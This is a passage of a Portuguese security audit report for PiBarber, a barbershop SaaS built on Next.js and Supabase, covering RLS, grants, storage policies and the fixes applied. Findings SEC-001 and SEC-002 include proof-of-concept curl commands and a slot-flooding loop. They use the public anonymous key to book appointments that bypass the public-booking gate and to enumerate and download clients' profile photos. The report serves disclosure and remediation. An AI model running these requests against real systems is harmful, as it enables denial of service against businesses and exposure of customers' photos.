# AUDITORIA_SEGURANCA.md — PiBarber

**Data da auditoria:** 16 de agosto de 2026
**Commit analisado:** `0f652a1173aeeece2ef9e95382983ce6a68d6a14` — "Link de acompanhamento mostra o endereço completo, com botão de copiar"
**Branch:** `main` (árvore de trabalho limpa no momento da análise)
**Sistema:** PiBarber — SaaS multi-tenant de barbearia. Next.js 15.5 (App Router) + React 19 + Supabase (Postgres + Auth + Storage). Três públicos: painel do dono/assistente (`/painel`), app do cliente (`/app`), perfil público sem login (`/b/[slug]`, `/a/[token]`).

> Este documento é escrito para ser lido por alguém — humano ou agente — **sem nenhum contexto prévio**. Cada achado é autossuficiente. Nenhum arquivo de código foi alterado durante a auditoria. **Nenhum exploit foi executado** e não houve conexão com o banco nem requisição a nenhum servidor da aplicação. A única coisa executada foi `npm audit`, na rodada 2.

**Rodada 2 (mesma data).** A primeira passagem cobriu banco, Server Actions e camada de dados. Esta rodada fechou a lacuna da camada de páginas e componentes — **todas as 25 páginas de `/painel` e `/app`** — e executou `npm audit`. Isso acrescentou **SEC-013**, **SEC-014** e **SEC-015**, e reescreveu **SEC-011** (que era BAIXO e virou ALTO) e **SEC-006** (que ganhou uma cadeia de exploração concreta). As lacunas que permanecem estão em "Escopo NÃO coberto".

---

## Premissa que vale para o documento inteiro

**A chave anônima do Supabase (`NEXT_PUBLIC_SUPABASE_ANON_KEY`) é pública.** Ela é embutida no HTML de toda página, por construção — o próprio `.env.example:3-5` diz isso: *"As duas primeiras vão para o navegador (prefixo `NEXT_PUBLIC_`) e podem aparecer no HTML — é assim que o Supabase funciona, e a RLS é o que protege o banco."*

Isso está **correto**. Mas tem uma consequência que organiza todos os achados abaixo: qualquer pessoa que abra o site pode extrair essa chave e falar **diretamente** com `https://<projeto>.supabase.co/rest/v1/…` e `/storage/v1/…`, sem passar por nenhuma linha de TypeScript deste repositório. Portanto:

> **Só valem como controle de segurança: as policies de RLS, os `grant` (de tabela, de coluna e de função), e as checagens dentro das funções `security definer`.**
>
> `middleware.ts`, `requireRole()`, `requireOwnerContext()` e qualquer condicional de tela são conveniência e experiência — **não são travas**. O próprio código diz isso, em `src/middleware.ts:6-15`.

Todos os achados marcados ALTO ou CRÍTICO abaixo são casos em que a trava real está ausente ou frouxa, e só a camada de conveniência está segurando.

---

## Como ler este documento

| Status | O que significa |
|---|---|
| **CONFIRMADO** | Deduzido lendo o código-fonte citado, com o trecho reproduzido. Nenhum exploit foi executado. |
| **SUSPEITA** | Depende de configuração de servidor, de estado do banco ou de comportamento de runtime que não foi possível inspecionar. |

Severidade, em termos do impacto para uma barbearia real e para os clientes dela: **CRÍTICO** · **ALTO** · **MÉDIO** · **BAIXO**.

---

## Escopo coberto

- **Todo o SQL de `supabase/`**: `01_schema.sql`, `02_functions.sql`, `03_rls.sql` e as migrations `07`–`20`, lidos na íntegra. (`04_seed.sql`, `05_criar_admin.sql`, `06_apagar_dados.sql` só por varredura de `grant`.)
- Os 11 arquivos de Server Actions de `src/app/actions/`, com as **60** actions que exportam. ⚠️ `services.ts` só foi lido na **Fase 3** — ver "Grau de evidência".
- `src/middleware.ts`, `src/lib/auth.ts`, `src/lib/env.ts`, `src/lib/supabase/{admin,client,publico,server}.ts`, `src/lib/{erros,geocoding,imagens}.ts`.
- As duas Route Handlers: `src/app/(auth)/callback/route.ts`, `src/app/app/perfil/acessos/google/route.ts`.
- `next.config.ts`, `.env.example`, `.gitignore`, `package.json`.
- Páginas públicas: `/b/[slug]`, `/b/[slug]/agendar`, `/a/[token]`, `src/app/layout.tsx`, `src/app/sitemap.ts`.
- Varreduras `grep` sobre todo `src/`: `dangerouslySetInnerHTML`, `createAdminClient`, `select("*")`, `any`/`as unknown as`, `@ts-ignore`.

## Escopo NÃO coberto — a lacuna, dita por inteiro

1. **Nenhum exploit foi executado, e nenhuma consulta tocou o banco.** **Todo achado sobre RLS e grants vale para o SQL do repositório, não necessariamente para o Postgres de produção** — não existe controle de versão de migrations neste projeto (ver "Riscos estruturais"), então não há como saber, sem consultar o banco, quais migrations foram aplicadas. **A primeira ação de qualquer correção deve ser rodar as consultas da seção "Verificações obrigatórias no banco real".**
2. **~57 dos 74 componentes de `src/components/` continuam sem leitura linha a linha** (contagem verificada na Fase 3; as rodadas anteriores diziam "~90", o que estava errado) — varridos por `grep` para `Math.random`, `window.*`, `localStorage`, `document.cookie`, `innerHTML` e `target="_blank"`, o que produziu SEC-011 e SEC-015. Não lidos integralmente: `EquipeProfissionais.tsx`, `ConfiguracoesPainel.tsx`, `NewAppointmentDialog.tsx`, `AgendaGrid.tsx`, `ComissoesPainel.tsx`, `AdminPainel.tsx`, `CaixaExtrato.tsx`, `ServicosPainel.tsx`, `FiadoPainel.tsx`, `LocalizacaoBarbearia.tsx`, e todos os de `client/`, `ui/` (exceto `Modal.tsx`) e `charts/`. **XSS e vazamento de dado sensível no bundle nesses arquivos não foram procurados exaustivamente.**
3. **Páginas ainda não lidas:** `/entrar`, `/criar-conta`, `/sem-barbearia`, `src/app/page.tsx` (landing), `/app/layout.tsx`, `/app/buscar` e sete subpáginas menores de `/app/perfil`. **Todas as 15 páginas de `/painel`, `/admin` e as principais de `/app` foram lidas na rodada 2.**
4. **`npm audit --omit=dev` FOI executado** e `package-lock.json` foi consultado para as versões reais — ver SEC-014. O que **não** foi feito: avaliar em detalhe cada CVE de libvips para determinar se são exploráveis por decode de arquivo (a categoria foi assumida como grave), nem verificar se existe patch dentro da linha 15.x do Next.
5. **Configuração do painel Supabase não foi inspecionada:** política de senha, limite de taxa de Auth, `db-max-rows` do PostgREST, Redirect URLs permitidas, atributos reais dos cookies de sessão, se "Confirm email" está ligado. Vários itens do checklist dependem disso.
6. **Não há webhooks neste sistema** — nenhum endpoint de recebimento foi encontrado. Portanto a exigência de "assinatura verificada / idempotência" não se aplica.
7. **Não há CORS customizado** na aplicação Next; o CORS que importa é o do PostgREST do Supabase, configurado no painel e não inspecionado.
8. **Já existe um `AUDITORIA.md` de uma rodada anterior na raiz do repositório. Ele não foi lido** e pode conter achados que se sobrepõem ou contradizem estes.

---

## Sumário por severidade

| Severidade | Qtd. | IDs |
|---|---|---|
| CRÍTICO | 1 | ~~SEC-001~~ — ✅ **[CORRIGIDO em 16/08/2026]**, ver o achado |
| ALTO | 6 | ~~SEC-002~~ ✅ **[CORRIGIDO em 16/08/2026]** (parcial — ver o achado), SEC-003, **SEC-006** (reclassificado), **SEC-011** (reclassificado), **SEC-013**, **SEC-014** |
| MÉDIO | 7 | ~~SEC-004~~ ✅ **[CORRIGIDO em 16/08/2026]** (só para `anon` — ver o achado), SEC-005, SEC-007, SEC-008, SEC-009, **SEC-016**, **SEC-017** |
| BAIXO | 4 | SEC-010, SEC-012, **SEC-015**, **SEC-018** |
| **Total** | **18** | |

Status: 17 **CONFIRMADO**, 1 **SUSPEITA**.

**Convenção de posição:** achados acrescentados em rodadas posteriores ficam onde foram inseridos, para os identificadores não mudarem entre versões. **A severidade que vale é sempre a do cabeçalho do achado**, não a da seção — hoje isso afeta `SEC-006` (ALTO, na seção MÉDIO).

Em negrito, o que mudou na rodada 2. Duas reclassificações, ambas para cima:

- **SEC-006 (proxy de imagem aberto) subiu de MÉDIO para ALTO** ao se descobrir, por `npm audit`, que a biblioteca que processa essas imagens (`sharp` 0.34.5) tem quatro CVEs abertas. As duas condições sozinhas eram incômodas; juntas, expõem processamento de imagem não confiável à internet inteira.
- **SEC-011 (senha provisória) subiu de BAIXO para ALTO** ao se descobrir que ela é gerada com `Math.random()` — e que o mesmo gerador cria a senha do **dono** da barbearia.

### Grau de evidência de cada achado (Fase 3)

Passagem de autocrítica: reli cada conclusão e classifiquei **por que** acredito nela. Três graus, e a diferença importa na hora de decidir se age ou se verifica antes:

- 🟢 **LIDO** — deduzido de código-fonte deste repositório, com `arquivo:linha` conferido. **As 31 citações que sustentam os achados CRÍTICO e ALTO foram reconferidas uma a uma na Fase 3** (`sed -n "Np" arquivo`) e todas resolvem para o trecho afirmado.
- 🔵 **EXECUTADO** — comando efetivamente rodado, com saída real reproduzida no achado.
- 🟡 **INFERIDO** — a leitura do repositório está certa, mas a conclusão depende do **comportamento de um componente de terceiro** que não exercitei. É onde eu posso estar errado.

| Achado | Grau | O que é inferência, quando é |
|---|---|---|
| SEC-001 | 🟢 | — o próprio `03_rls.sql:546-553` documenta que `anon` alcança RPC por `/rest/v1/rpc/`, o que corrobora a leitura |
| **SEC-002** | 🟢 + 🟡 | A policy sem recorte é **lida**. É **inferência** que a API de listagem do Storage (`/storage/v1/object/list`) seja governada por essa mesma policy de `select`. Se o Supabase tratar listagem por outro caminho, o achado cai de ALTO para MÉDIO — vira "URL não secreta" em vez de "enumerável". **Verificar primeiro** |
| SEC-003 | 🟢 | A serialização de props para o payload RSC é comportamento do Next, não deste repositório — mas o vazamento independe disso: o `grant` sozinho já abre a coluna pela API |
| SEC-004 · SEC-009 | 🟢 | — |
| SEC-005 | 🟢 | Ausência de `headers()` em `next.config.ts` é fato do arquivo |
| **SEC-006 + SEC-014** | 🔵 + 🟡 | `npm audit` foi **executado** (saída reproduzida). É **inferência** que as CVEs de libvips sejam alcançáveis por decode de arquivo remoto — não avaliei cada CVE. A categoria justifica tratar como grave, mas a cadeia não está provada |
| SEC-007 · SEC-010 · SEC-011 · SEC-012 · SEC-013 · SEC-015 · SEC-016 | 🟢 | — |
| SEC-008 | 🟢 + ⚪ | A ausência de limite no código é lida. O limite nativo do Supabase Auth **não foi verificado** — por isso o achado é SUSPEITA para o caso de autenticação |
| **SEC-017** | 🟢 + 🟡 | O `console.error` do objeto inteiro é **lido**. É **inferência** que o campo `details` do Postgres traga os valores da linha em `23505`. É o formato documentado, mas **não observei a saída real** |
| **SEC-018** | 🔵 + 🟡 | Os defaults foram **lidos da biblioteca instalada** em `node_modules`. É **inferência** que eles cheguem intactos ao `Set-Cookie` — não observei o header real |

**Nada foi eliminado nesta passagem por falta de evidência.** Todo achado sobrevive com `arquivo:linha`. O que mudou foi a rotulagem: quatro achados (SEC-002, SEC-006/014, SEC-017, SEC-018) passaram a declarar explicitamente qual parte é inferência, para que ninguém os trate como provados quando não estão.

**Duas correções de fato foram feitas na Fase 3**, ao conferir números que eu havia afirmado:

| O que eu disse | O que é | Onde entrou |
|---|---|---|
| "34 Server Actions exportadas" | **60** (verificado por `grep -c`) | Matriz de IDOR reescrita; 27 recebem id do chamador, não 25 |
| "~90 componentes" | **74** (verificado por `find`) | Escopo dos dois documentos |
| "todas as 11 Server Actions lidas", incluindo `services.ts` | **`services.ts` não tinha sido lido** | Lido na Fase 3; rendeu **BUG-023** e três linhas novas na matriz |

O terceiro é o mais grave dos três: **eu declarei ter lido um arquivo que não li.** Ele foi encontrado porque a Fase 3 conferiu contagens em vez de confiar no que a Fase 1 tinha escrito. Vale como aviso sobre o resto do relatório — o método achou um erro desses; pode haver outro que ele não achou.

---

### O que NÃO foi encontrado (e foi procurado)

Registrado porque a ausência tem valor:

- **Nenhum segredo hardcoded ou commitado.** `.gitignore:7-9` cobre `.env`, `.env.local` e `.env*.local`. `.env.example` contém apenas nomes de variável e comentários — verificado linha a linha.
- **A service role nunca alcança o navegador.** `src/lib/supabase/admin.ts:1` abre com `import "server-only"`, o que quebra o build se alguém a importar de um `"use client"`. Seus 5 usos (`admin.ts`, `client.ts`, `publico.ts`, `team.ts`) foram todos lidos: **todos** confirmam o papel do chamador **antes** de instanciar o cliente admin, e o único que roda sem sessão (`publico.ts`) delega toda a validação a funções do Postgres, o que é a razão declarada de existir (`src/app/actions/publico.ts:18-33`).
- **Sem SQL injection.** Não há SQL cru montado por concatenação em lugar nenhum. Todas as funções do banco usam parâmetros tipados. O único filtro montado por string é o `.or()` do PostgREST em `src/app/actions/customers.ts:66`, que é sanitizado e adicionalmente recortado por um `.eq("barbershop_id", shopId)` separado (detalhado como BUG-014 em `AUDITORIA_BUGS.md` — é robustez, não vulnerabilidade).
- **Sem XSS por `dangerouslySetInnerHTML`.** Os dois usos são de conteúdo estático controlado pelo código: `src/app/layout.tsx:89` (script de tema, constante de `src/lib/theme.ts`) e `src/app/page.tsx:236` (JSON-LD de dados estruturados constantes).
- **Sem open redirect.** `destinoSeguro()` em `src/app/actions/auth.ts:68-72` rejeita destino que não comece com `/` e rejeita `//`. A Route Handler de callback repete a checagem (`src/app/(auth)/callback/route.ts:68`).
- **Escalada de privilégio por auto-promoção está fechada, e bem.** `handle_new_user()` força `role = 'client'` ignorando o metadata do cadastro (`supabase/02_functions.sql:45`), e o `revoke update on profiles` + `grant update (colunas)` de `supabase/03_rls.sql:529-531` impede um `PATCH {"role":"owner"}` — com o motivo escrito por extenso no comentário das linhas 523-528. Mesma técnica em `barbershops` para `owner_id` e `rating_*` (linhas 535-542).
- **`getUser()` em vez de `getSession()`** no middleware (`src/middleware.ts:56-60`) e em `getProfile()` (`src/lib/auth.ts:36-40`), com o motivo comentado: `getSession()` só lê o cookie, que o usuário controla. Correto.
- **Nenhum `useEffect` sem cleanup** entre os quatro inspecionados; nenhuma subscrição de realtime no projeto (`grep` por `.channel(` e `subscribe(` não retornou nada).
- **A trava contra double booking é física**, não de aplicação: a constraint `appointments_no_overlap` (`supabase/12_status_agendado.sql:97-101`) é um `EXCLUDE USING gist`. É a decisão mais forte do schema.
- **Isolamento multi-tenant: nenhum caminho encontrado** em que o dono de uma barbearia leia ou altere dados de outra. Cada policy operacional passa por `has_shop_access(barbershop_id)` e cada policy financeira por `can_manage_money(barbershop_id)`; ambas as funções derivam a barbearia de `auth.uid()`, nunca de parâmetro (`supabase/02_functions.sql:157-191`). As Server Actions derivam `shopId` de `requireShopContext()`/`requireOwnerContext()`, também de `auth.uid()`, **nunca do payload**. O único ponto onde um uuid de terceiro é aceito como entrada — `professionals.profile_id`, em `salvarProfissional` — é protegido por trigger dedicado (`professionals_guard_profile`, `supabase/15_comissao_do_dia.sql:111-152`), e o comentário de `src/app/actions/team.ts:70-73` explica que a checagem não pode ficar na aplicação.
  **A rodada 2 reforçou esta conclusão:** as 15 páginas de `/painel`, `/admin` e as principais de `/app` foram lidas na íntegra, e **todas** abrem com `requireShopContext()`, `requireOwnerContext()`, `requireRole(["client"])` ou `requireAdmin()`, com o `shopId` sempre vindo do contexto. Nenhuma página aceita `barbershop_id` por parâmetro de rota ou query. **Este é o ponto mais forte do sistema.**
  ⚠️ **Distinção que importa:** isto vale para o isolamento **entre barbearias**. A separação de papéis **dentro** de uma mesma barbearia tem uma falha — **SEC-013**, em que o assistente alcança receita por cliente. Um cuidado não implica o outro, e não deve ser lido como se implicasse.

---

# CRÍTICO

## SEC-001 — `book_appointment` é executável por `anon` e contorna inteiramente o portão do agendamento público

| Campo | Valor |
|---|---|
| **Severidade** | CRÍTICO |
| **Arquivo:linha** | `supabase/13_agendamento_avulso.sql:467` (o grant) · `supabase/13_agendamento_avulso.sql:260-462` (corpo) · `src/app/actions/booking.ts:183-210` (segunda porta) |
| **Status** | CONFIRMADO |
| **Achado gêmeo** | BUG-001 e BUG-010 em `AUDITORIA_BUGS.md` (mesmo defeito, ângulo funcional) |

> ## ✅ [CORRIGIDO em 16/08/2026]
>
> Criada a migration **`supabase/21_fecha_book_appointment.sql`**, com três partes:
>
> 1. **`revoke execute … from anon`** em `book_appointment`; `authenticated` permanece. Fecha o vetor principal (Passos 1-4) **e o Passo 5**: sem cookie de sessão, o PostgREST trata a chamada da Server Action `agendar` como `anon`, que perdeu o grant.
> 2. **`create or replace` da função** acrescentando a conferência de disponibilidade real quando `v_source = 'online'` — `exists (select 1 from get_available_slots(p_professional, v_dia, v_duracao) where slot = p_quando)`, a mesma de `book_appointment_publico`. O ramo `'manual'` ficou de fora de propósito (encaixe de balcão). **Muda o comportamento do cliente logado**, que até aqui agendava fora do expediente pelo caminho normal — decisão tomada com o dono do produto.
> 3. **Portão de migração** espelhando o do arquivo 17: `has_function_privilege('anon', …, 'EXECUTE')` → `raise exception`. Confere também que `authenticated` manteve o grant, que o bloco nº 7 entrou, e que as travas C-1, C-2 e a ordem de chegada (nº 6) não se perderam no `create or replace`.
>
> **Além do que a auditoria apontou:** o grant estava em **três** arquivos, não um. `supabase/03_rls.sql:565`, `supabase/11_book_appointment_autorizacao.sql:249` e `supabase/13_agendamento_avulso.sql:467` foram todos alterados de `to anon, authenticated` para `to authenticated`, com comentário apontando para a migration 21. Sem isso, reaplicar qualquer um deles reabriria o buraco em silêncio.
>
> **Verificado:** o corpo da função nova é idêntico ao do arquivo 13 exceto pela variável `v_dia` e pelo bloco nº 7 (conferido por `diff`). Os portões do 13 e do 19, que inspecionam o corpo por regressão, continuam encontrando os padrões que procuram.
>
> **NÃO foi feito** — o item 4 da correção sugerida (trocar `getProfile()` por exigência de sessão em `src/app/actions/booking.ts:183`). Ele coincide com **BUG-010**, classificado MÉDIO, e ficou fora do escopo desta rodada de correções. A Parte 1 já fecha essa porta; a mudança em `booking.ts` seria defesa em profundidade. **Continua pendente.**
>
> ⚠️ **Pendente de verificação:** não há `psql` na máquina onde a correção foi escrita, então **a migration não foi executada nem validada sintaticamente**. Aplicar num ambiente de teste antes de produção. Continua valendo a advertência de RA-3: sem controle de versão de migrations, é preciso confirmar no banco real qual estado está aplicado — rodar a consulta de `has_function_privilege` da seção "Verificações obrigatórias no banco real" **antes e depois**.

### O que está errado

```sql
-- supabase/13_agendamento_avulso.sql:466-467
revoke execute on function book_appointment(uuid, uuid, timestamptz, uuid[], uuid, uuid, text, text, text, appointment_source) from public;
grant execute on function book_appointment(uuid, uuid, timestamptz, uuid[], uuid, uuid, text, text, text, appointment_source) to anon, authenticated;
```

As migrations 17 e 20 construíram um portão elaborado para o agendamento sem cadastro. `book_appointment_publico` verifica, nesta ordem (`supabase/20_link_expira_e_rajada.sql:301-489`):

1. `barbershops.allow_public_booking` — o liga/desliga por loja, que **nasce desligado** (`supabase/17_agendamento_publico.sql:77-78`);
2. nome com ≥ 3 caracteres, telefone com 10-11 dígitos, DDD existente (`ddd_valido`), nono dígito 9 em celular;
3. **seis limites anti-abuso**: rajada por IP (30s), flood por IP (6/min), 3/hora por IP, 5/dia por IP, 3/dia por telefone, e **2 agendamentos ativos por telefone naquela loja**;
4. **a conferência do horário contra `get_available_slots`** — que é a única coisa no sistema que conhece `business_hours`, `break_start`/`break_end`, `time_off` e `professional_schedules`.

E ela é **deliberadamente inalcançável** por `anon`, com o motivo escrito em maiúsculas no topo do arquivo (`supabase/17_agendamento_publico.sql:7-23`) e um portão de migração que faz o deploy **falhar** se alguém conceder o grant (`supabase/17_agendamento_publico.sql:714-734`). O desenho é explícito: `navegador → Server Action → service role → função`.

**Mas `book_appointment`, a função que `book_appointment_publico` chama por dentro, continua concedida a `anon`** — e ela não faz **nada** dos quatro itens acima. Lendo o corpo inteiro (linhas 260-462), ela valida apenas: loja ativa, `accepts_online_booking`, `min_advance_minutes`, `max_advance_days`, profissional da loja, serviços da loja, e nome+telefone não vazios.

A porta blindada foi construída ao lado de uma porta que ficou destrancada.

### Vetor de ataque — passo a passo

Tudo abaixo usa **apenas a chave anônima**, extraída do HTML de qualquer página do site.

**Passo 1 — reconhecimento.** As tabelas necessárias são todas legíveis por `anon` (`supabase/03_rls.sql:518`):

```bash
ANON="<chave anônima, copiada do HTML>"
URL="https://<projeto>.supabase.co"

# Todas as lojas ativas, inclusive as que NÃO permitem agendamento sem cadastro:
curl -s "$URL/rest/v1/barbershops?select=id,slug,name,accepts_online_booking,allow_public_booking&is_active=eq.true" -H "apikey: $ANON"

# Profissionais e serviços de cada uma:
curl -s "$URL/rest/v1/professionals?select=id,name&barbershop_id=eq.$SHOP&is_active=eq.true" -H "apikey: $ANON"
curl -s "$URL/rest/v1/services?select=id,duration_minutes&barbershop_id=eq.$SHOP&is_active=eq.true" -H "apikey: $ANON"
```

**Passo 2 — agendar numa loja que exige cadastro.** Escolher uma com `allow_public_booking = false` (o padrão de toda loja nova):

```bash
curl -s -X POST "$URL/rest/v1/rpc/book_appointment" \
  -H "apikey: $ANON" -H "Content-Type: application/json" \
  -d '{"p_shop":"'$SHOP'","p_professional":"'$PROF'",
       "p_quando":"2026-08-23T04:00:00-03:00",
       "p_service_ids":["'$SERVICE'"],
       "p_nome":"Fulano","p_telefone":"00000000000"}'
```

`2026-08-23` é um domingo, e 04:00 é fora de qualquer expediente. **Resultado esperado se o defeito existe:** HTTP 200 com o uuid do agendamento. O único cuidado é respeitar `min_advance_minutes` (padrão 60) e `max_advance_days` (padrão 60) — são as duas únicas travas temporais que este caminho aplica.

**Passo 3 — negação de serviço sobre a agenda.** Sem limite por IP, sem limite por telefone e sem validação de DDD, um laço percorre cada profissional de cada loja ativa e ocupa cada slot de 15 minutos dentro da janela de `max_advance_days`:

```
para cada loja ativa:
  para cada profissional ativo:
    para cada dia dentro de max_advance_days:
      para cada slot de 15 em 15 minutos:
        book_appointment(..., p_telefone = <11 dígitos aleatórios>)
```

A constraint `appointments_no_overlap` **não defende** — ela garante o oposto: cada agendamento falso bloqueia definitivamente aquele horário para um cliente real. O custo para o atacante é uma requisição HTTP por horário.

**Passo 4 — poluição permanente de `customers`.** Cada telefone novo cria uma linha em `customers` (`supabase/13_agendamento_avulso.sql:426-428`), que é a aba Clientes que o dono usa todos os dias. As fichas não expiram e não há como distingui-las das reais em massa.

**Passo 5 (variante) — pela Server Action, sem a chave.** `agendar` em `src/app/actions/booking.ts:183` usa `getProfile()`, não `requireProfile()`, e trata explicitamente o caso `!perfil` (linhas 192-195). Uma requisição de Server Action **sem cookie de sessão** cai no mesmo `book_appointment` (linha 199) com as mesmas ausências. Ou seja: existem duas entradas para o mesmo buraco. A separação entre "com sessão" e "sem sessão" está no componente de cliente `BookingWizard.tsx:215-236` — ou seja, **no navegador do atacante**.

### Impacto

| Consequência | Efeito |
|---|---|
| Regra de produto anulada | Toda barbearia com `accepts_online_booking` aceita agendamento anônimo, mesmo tendo `allow_public_booking = false`. A opção que "nasce desligada" nunca esteve desligada de fato. |
| Negação de serviço no negócio | A agenda de qualquer barbearia pode ser lotada com horários falsos, a custo desprezível. Cliente real recebe "sem horário livre". |
| Integridade da agenda | Agendamentos em domingo fechado, no almoço e em cima de férias registradas em `time_off`. |
| Poluição de dados | Fichas de cliente permanentes com telefones inválidos. |
| Custo de infraestrutura | Escritas ilimitadas no Postgres sem nenhum limite de taxa. |

### Correção sugerida (descrição, não patch)

1. **Revogar `anon` de `book_appointment`.** É a correção de uma linha que fecha os dois vetores. `book_appointment_publico` a chama por dentro e, sendo `security definer`, **não depende do grant do chamador** — o comentário de `supabase/17_agendamento_publico.sql:498-508` já documenta exatamente essa mecânica para o caso do `service_role`. `authenticated` deve permanecer: é por ela que o cliente logado agenda.
2. **Espelhar o portão de migração.** A migration 17 já criou o teste que faz o deploy falhar se `book_appointment_publico` ganhar grant para `anon` (linhas 719-734). Criar o teste equivalente para `book_appointment`: `if has_function_privilege('anon', p.oid, 'EXECUTE') then raise exception ...`. Sem ele, a regressão volta em silêncio.
3. **Fazer `book_appointment` conferir a disponibilidade real** quando `v_source = 'online'`, reaproveitando o mesmo `exists (select 1 from get_available_slots(...) where slot = p_quando)` de `supabase/20_link_expira_e_rajada.sql:460-465`. Isso protege também o **cliente logado**, que hoje pode agendar fora do expediente pelo caminho normal. O ramo `'manual'` continua sem a checagem, porque encaixe fora do horário é o normal do balcão — é a razão de `p_source` existir e de a trava C-1 (`supabase/13_agendamento_avulso.sql:312-315`) restringi-lo a quem tem `has_shop_access`.
4. **Em `src/app/actions/booking.ts`, trocar `getProfile()` por uma exigência de sessão** e remover o bloco `if (!perfil)` das linhas 192-195. `agendar` passa a ser exclusivamente o caminho de quem tem conta; o visitante tem uma porta só, `agendarSemLogin`.

---

# ALTO

## SEC-002 — O bucket público `imagens` pode ser **listado** por visitante anônimo, expondo as fotos de perfil de todos os clientes

| Campo | Valor |
|---|---|
| **Severidade** | ALTO |
| **Arquivo:linha** | `supabase/14_storage_imagens.sql:145-148` (a policy) · `supabase/14_storage_imagens.sql:64-75` (o bucket) · `src/lib/imagens.ts:44-49,164` (o formato do caminho) |
| **Status** | CONFIRMADO (por leitura do SQL; a listagem em si não foi executada — ver "Como confirmar") |

> ## ✅ [CORRIGIDO em 16/08/2026] — parcialmente; ver "o que continua pendente"
>
> Adotada a **opção 2** da correção sugerida (recorte da policy de select), na migration **`supabase/22_imagens_leitura_recortada.sql`**. A policy única sem filtro deu lugar a duas:
>
> - **`imagens_leitura_publica`** (`anon`): `split_part(name, '/', 1) in ('barbearias', 'barbeiros')`. A vitrine continua pública; `clientes/` deixa de ser enumerável por quem não tem conta.
> - **`imagens_leitura_privada`** (`authenticated`): a vitrine **mais** `pode_escrever_imagem(name)`.
>
> **Por que a segunda policy precisa do `pode_escrever_imagem`** — isto não estava no achado e quase virou uma regressão silenciosa: `apagarImagemAntiga()` (`src/lib/imagens.ts:192-203`) chama `storage.remove()`, e o Storage faz um **`select` interno** para localizar o objeto antes de apagá-lo. Tirar `clientes/` do select faria a faxina da foto antiga falhar — e a função **engole o erro de propósito** (comentário nas linhas 185-189). O bucket acumularia foto órfã sem nada aparecer em lugar nenhum.
>
> **Verificado antes de aplicar, e é o que tornou esta opção segura:**
> - A aplicação **nunca chama `.list()`**. Os únicos usos do Storage em `src/` são `getPublicUrl`, `upload` e `remove` (`src/lib/imagens.ts:125,167,198`).
> - `getPublicUrl` **não faz requisição** — só monta a string. O download acontece por `/storage/v1/object/public/…`, que num bucket público **não consulta a RLS**. Nenhuma tela perde imagem: nem a logo em `/b/[slug]`, nem a foto do cliente para ele mesmo ou para a equipe.
>
> **Também alterado:** `supabase/14_storage_imagens.sql` — a policy original foi substituída pelas duas recortadas e o portão passou a exigir 5 policies e a **falhar** se `imagens_leitura` (a sem recorte) reaparecer. Sem isso, reaplicar o arquivo 14 reabriria a enumeração em silêncio. O bloco de ROLLBACK do 14 também foi atualizado.
>
> ### O que continua PENDENTE
>
> O bucket segue `public = true`, e num bucket público o endpoint `/storage/v1/object/public/…` **serve o arquivo sem consultar a RLS**. Quem já souber o caminho completo de uma foto continua baixando — o carimbo de 13 dígitos é obscuridade, não controle.
>
> **A opção 1 do achado (separar `clientes/` para um bucket privado + `createSignedUrl`) continua sendo a correção certa e NÃO foi feita.** Ela custa migration de bucket, mover os objetos existentes e mexer em `src/lib/imagens.ts`, e as URLs assinadas expiram — exige cuidado onde a foto é renderizada em componente servidor com cache. Decisão de escopo tomada com o dono do produto: fechar primeiro a enumeração em massa, que é o que torna o achado ALTO.
>
> ⚠️ **Não executado:** sem `psql` na máquina, a migration não foi rodada nem teve a sintaxe validada. **E a parte 🟡 do achado continua sem verificação:** não foi confirmado contra o projeto real que a API de listagem é de fato governada por esta policy. Se a inferência estiver errada, esta correção não causa dano — fecha algo que já estaria fechado. Rodar o passo 1 de "Como confirmar" **antes e depois**.

### O que está errado

O bucket é público e a policy de leitura não tem recorte nenhum:

```sql
-- supabase/14_storage_imagens.sql:145-148
drop policy if exists imagens_leitura on storage.objects;
create policy imagens_leitura on storage.objects
  for select to anon, authenticated
  using (bucket_id = 'imagens');
```

A intenção declarada (linhas 28-37) é que **a leitura do conteúdo** seja pública: a logo da barbearia precisa aparecer em `/b/[slug]` para quem não tem conta. Essa parte está certa e é necessária.

O que passou despercebido: no Supabase, a API de **listagem** (`POST /storage/v1/object/list/{bucket}`) também é servida por um `select` sobre `storage.objects`, e portanto é governada **pela mesma policy**. Uma policy `using (bucket_id = 'imagens')` sem qualquer filtro de caminho concede, junto com a leitura, a **enumeração de todos os objetos do bucket**.

E o bucket guarda quatro coisas de naturezas diferentes no mesmo espaço (`src/lib/imagens.ts:44-49`):

```ts
export const DESTINOS = {
  logo:     { pasta: "barbearias", arquivo: "logo",  lado: 512 },
  capa:     { pasta: "barbearias", arquivo: "capa",  lado: 1600 },
  barbeiro: { pasta: "barbeiros",  arquivo: "foto",  lado: 512 },
  cliente:  { pasta: "clientes",   arquivo: "foto",  lado: 512 },   // ← esta não é pública
};
```

O caminho é montado em `src/lib/imagens.ts:164`:

```ts
const caminho = `${destino.pasta}/${dono}/${destino.arquivo}-${Date.now()}.${extensao}`;
// clientes/{profile_id}/foto-1765432100000.webp
```

A **escrita** está bem protegida — `pode_escrever_imagem()` (`supabase/14_storage_imagens.sql:93-130`) confere `v_uuid = auth.uid()` para a pasta `clientes/` e rejeita caminho com número de segmentos diferente de 3, o que fecha path traversal (`clientes/<outro>/../meu/foto.webp`). O bucket também limita 5 MB e restringe MIME a JPEG/PNG/WebP (linhas 64-75), e o comentário das linhas 58-62 explica que essa é a validação que vale, não a do navegador. **Tudo isso está correto.** O problema é exclusivamente a leitura sem recorte.

### Vetor de ataque

```bash
ANON="<chave anônima do HTML>"
URL="https://<projeto>.supabase.co"

# 1. Listar as pastas de clientes — devolve um profile_id por entrada:
curl -s -X POST "$URL/storage/v1/object/list/imagens" \
  -H "apikey: $ANON" -H "Content-Type: application/json" \
  -d '{"prefix":"clientes/","limit":1000,"offset":0}'

# 2. Para cada profile_id, listar os arquivos:
curl -s -X POST "$URL/storage/v1/object/list/imagens" \
  -H "apikey: $ANON" -H "Content-Type: application/json" \
  -d '{"prefix":"clientes/<PROFILE_ID>/","limit":100,"offset":0}'

# 3. Baixar (o bucket é public: não precisa nem de chave):
curl -sO "$URL/storage/v1/object/public/imagens/clientes/<PROFILE_ID>/foto-<TS>.webp"
```

O atacante obtém, sem conta e sem sessão: **a foto de rosto de todo cliente que subiu uma**, associada ao `profile_id` dele. E o `profile_id` **não é opaco neste sistema** — ele vaza por dois outros caminhos descritos neste mesmo documento:

- `reviews.profile_id` é legível por `anon` (**SEC-004**), o que liga cada foto a **quais barbearias a pessoa frequenta** e ao que ela escreveu nas avaliações;
